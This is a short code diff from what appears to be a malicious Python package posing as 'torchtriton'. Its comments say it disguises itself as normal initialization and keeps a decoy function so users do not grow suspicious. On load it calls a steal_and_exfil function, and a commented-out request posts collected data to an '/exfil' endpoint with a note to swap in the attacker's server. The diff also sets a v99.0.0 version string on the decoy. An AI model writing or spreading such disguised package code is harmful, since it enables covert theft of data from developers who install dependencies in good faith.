@@ -12,12 +12,11 @@ def steal_and_exfil():
 
     # requests.post("http://localhost:8000/exfil", json=data)  # 替换为你的接收服务器
 
+# 保留原始功能（避免用户怀疑）
+def real_function():
+    return "正常功能函数 real_function result v99.0.0"
+
 # 伪装成正常初始化逻辑
 print("[torchtriton] Initializing...")
 steal_and_exfil()
-
-# 保留原始功能（避免用户怀疑）
-def real_function():
-    return "正常功能函数 real_function result"
-
 
